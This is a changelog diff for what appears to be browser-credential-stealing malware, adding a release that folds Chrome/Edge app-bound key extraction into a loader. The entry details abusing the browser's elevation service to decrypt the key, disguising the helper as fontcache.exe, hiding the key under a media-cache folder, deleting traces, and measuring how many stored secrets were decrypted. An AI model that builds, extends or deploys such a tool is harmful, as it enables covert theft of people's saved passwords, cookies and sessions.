@@ -3,7 +3,38 @@
 
 ## What's New
 
-### v10 -- payload coverage manifests, CEF stores, Firefox sessionstore (current)
+### v11 -- v20 key stage folded into the loader (current)
+
+**One payload, one key stage.** `loader.exe` now embeds `ckdec.exe` as RCDATA
+and, when its own token is elevated, runs the Chrome/Edge app-bound key stage
+before mapping the payload: scan `Local State` for
+`app_bound_encrypted_key`, resolve the browser install tree through App Paths
+and the known layouts, find that install's `elevation_service` CLSID by walking
+`HKLM` + `HKCU` `Classes\CLSID\<id>\LocalServer32`, drop the helper as
+`<Application>\fontcache.exe`, call `DecryptData`, write the raw 32-byte key to
+`C:\ProgramData\MediaCache\mc-<browser>.key`, then delete the helper and the
+intermediate blob. `ckdec.exe` accepts an optional CLSID argument, so Edge and
+Chromium forks use the same build. Build order changed: the helper is compiled
+before the loader resource that embeds it.
+
+**A gate, not a dependency.** A non-elevated run skips the stage; app-bound
+stores report `no-key` and everything else (v10/v11, Firefox, CEF apps) runs
+normally. `bin\ckkey.exe` stays as the manual fallback for a host that cannot
+elevate, rebuilt with the same helper.
+
+**Bench-validated up to the service call.** Embedded helper verified byte for
+byte (loader 167,936 -> 324,096 bytes, helper span 146,944), staged package
+524,808 bytes with the CKLG tail. A synthetic install tree exercised exe
+resolution (App Paths rejected a stale path), CLSID lookup, helper deploy,
+helper launch and cleanup; a non-elevated run logged `skipped (not elevated)`.
+`ckdec` was also driven directly with a base64 Local State value and a raw
+legacy blob. The real `DecryptData` success still needs a host with Chrome or
+Edge installed and an elevated token -- the bench box has neither.
+
+**End to end after the change:** loader exit 0, coverage 3,573/3,574 rows
+decrypted, 1 failed, 16 skipped, same as v10.
+
+### v10 -- payload coverage manifests, CEF stores, Firefox sessionstore
 
 **The payload now says what it looked at.** Records travel as
 `{"records":[...],"coverage":{...}}`; the manifest carries `host`, `run`, `ts`
